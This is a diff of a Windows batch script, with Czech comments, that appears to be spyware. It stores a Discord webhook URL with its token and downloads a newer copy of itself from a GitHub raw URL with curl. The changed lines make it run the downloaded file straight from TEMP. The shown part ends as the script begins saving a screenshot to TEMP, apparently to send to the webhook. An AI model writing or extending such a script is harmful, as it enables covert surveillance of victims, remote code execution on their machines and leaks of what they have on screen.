@@ -7,22 +7,20 @@ set "webhook=https://discord.com/api/webhooks/1439411134137499698/1LxkdwQcxAxk-N
 
 :: 🔁 GitHub RAW URL pro aktualizaci
 set "updateURL=https://raw.githubusercontent.com/fanysfanys00-ctrl/mc/refs/heads/main/takpojd.bat"
-set "localPath=%~f0"
-set "tempNew=%TEMP%\takpojd_new.bat"
+set "currentPath=%~f0"
+set "updatePath=%TEMP%\takpojd_update.bat"
 
 :: 📥 Stáhni novou verzi
-curl -s "%updateURL%" -o "%tempNew%"
+curl -s "%updateURL%" -o "%updatePath%"
 
 :: 🔍 Porovnej s aktuální verzí
-fc /b "%tempNew%" "%localPath%" >nul
+fc /b "%updatePath%" "%currentPath%" >nul
 if errorlevel 1 (
-    echo 🔄 Nová verze detekována — aktualizuji...
-    copy /y "%tempNew%" "%localPath%" >nul
-    del /f /q "%tempNew%"
-    start "" "%localPath%"
+    echo 🔄 Nová verze detekována — spouštím aktualizovanou verzi...
+    start "" "%updatePath%"
     exit
 )
-del /f /q "%tempNew%"
+del /f /q "%updatePath%"
 
 :: 📸 Screenshot do TEMP
 set "ss=%TEMP%\screenshot_%RANDOM%.png"
